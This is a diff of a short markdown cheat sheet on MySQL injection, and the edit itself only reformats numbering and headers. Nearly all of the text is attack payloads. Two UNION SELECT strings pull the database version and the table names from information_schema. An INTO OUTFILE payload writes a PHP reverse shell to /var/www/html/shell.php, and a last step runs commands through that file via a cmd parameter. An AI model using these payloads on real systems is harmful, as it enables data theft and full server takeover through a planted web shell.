@@ -1,10 +1,10 @@
 # uploading File with Mysql
-1.
+
+Basic:
 ```<VALUE>' union select 1, @@version-- -```
-2.
 ```<VALUE>' union select 1, table_name FROM information_schema.tables-- -```
 
-> uploading:
+uploading:
 ```<VALUE>' INTO OUTFILE '/var/www/html/shell.php' LINES TERMINATED BY <Sting to Text"php rev shell">#```
 
 > then go to http://example.com/shell.php?cmd=`<exec>`
